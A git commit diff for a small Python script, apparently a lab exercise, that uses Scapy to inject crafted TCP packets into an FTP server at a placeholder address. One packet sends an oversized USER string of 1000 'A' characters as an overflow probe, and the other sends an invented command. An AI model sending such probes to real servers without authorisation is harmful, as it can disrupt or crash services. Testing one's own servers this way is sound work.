9274ce4b42f74dcb33925a955010c4f95f3792de
Alan <163225488+AlanGK7@users.noreply.github.com>
2025-07-01 22:58:07 -0400

    Update inyection.py

--- inyection.py
+++ inyection.py
@@ -1,4 +1,5 @@
-
+#Primera inyección: Intento de inicio de sesión con una cadena USER muy grande
 send(IP(dst="ip_servidor")/TCP(sport=RandShort(), dport=21, flags="PA")/Raw(load="USER " + "A"*1000 + "\r\n"))
 
+#Inyección 2: comando inventado
 send(IP(dst="ip_servidor")/TCP(sport=RandShort(), dport=21, flags="PA")/Raw(load="INVALIDCMD arg\r\n"))
